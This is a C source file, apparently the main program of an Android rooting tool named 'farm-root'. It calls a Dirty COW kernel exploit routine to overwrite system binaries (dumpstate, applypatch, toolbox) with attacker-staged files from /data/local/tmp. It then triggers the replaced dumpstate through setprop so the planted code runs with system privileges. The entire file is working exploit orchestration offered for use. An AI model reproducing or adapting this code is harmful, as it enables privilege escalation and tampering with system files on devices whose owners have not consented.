#include <android/log.h>
#include <unistd.h>
#include <sys/system_properties.h>

#include "shared.h"

// dirtycow.c
int dirtycow(const char *dst, const char *src);

int main(int argc, const char *argv[]) {
	LOGV("[*] farm-root started");
	rsf_unset(RSF_ALL_DONE);

	LOGV("[*] building a bridge");
	if( dirtycow("/system/bin/dumpstate", "/data/local/tmp/bridge") ) {
		LOGV("ERROR: could not overwrite /system/bin/dumpstate");
		return 1;
	}

	LOGV("[*] starting the bridge");
	if(!fork()) {
		const char *args[] = {"/system/bin/setprop", "ctl.start", "dumpstate", 0};
		if( execv(args[0], (char *const *)args) ) {
			LOGV("ERROR running setprop");
			return 0;
		}
	}

	LOGV("[*] putting a till back in the shed");
	if( dirtycow("/system/bin/applypatch", "/data/local/tmp/till") ) {
		LOGV("ERROR: could not overwrite /system/bin/applypatch");
		return 1;
	}

	LOGV("[*] overwriting the toolbox");
	if( dirtycow("/system/bin/toolbox", "/data/local/tmp/toolbox") ) {
		LOGV("too much of a mess");
		return 1;
	}

	LOGV("[*] waiting for process to finish");
	while(!rsf_check(RSF_ALL_DONE)) sleep(1);

	LOGV("[*] done!");

	return 0;
}
